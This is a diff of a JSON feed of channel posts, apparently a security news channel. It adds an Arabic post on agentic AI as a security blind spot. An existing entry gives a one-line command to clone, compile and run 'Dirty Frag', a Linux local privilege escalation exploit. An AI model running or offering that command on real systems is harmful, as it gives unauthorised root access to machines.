@@ -40,5 +40,11 @@
     "username": "E.H.D",
     "text": "Dirty Frag: Universal Linux LPE\n\nOne-line specialgit clone https://github.com/V4bel/dirtyfrag.git && cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp\n\n📱 https://github.com/V4bel/dirtyfrag",
     "timestamp": "2026-05-11T16:46:46.034918"
+  },
+  {
+    "user_id": -1001615733999,
+    "username": "E.H.D",
+    "text": "🤖 الذكاء الاصطناعي الوكيل يعمل بالفعل في الإنتاج بينما تعامل فرق الأمن الأمر على أنه مسألة سياسة.\n\nلا يمكنك تأمين ما لا تفهمه. ثلاثة أنواع من الوكلاء — واحد الآن يسمح لأي شخص ببناء وكلاء قوية مع وصول حقيقي، بدون حاجة للكود.\n\nاقرأ عنه: https://thehackernews.com/2026/05/why-agentic-ai-is-securitys-next-blind.html",
+    "timestamp": "2026-05-12T12:40:15.552512"
   }
 ]
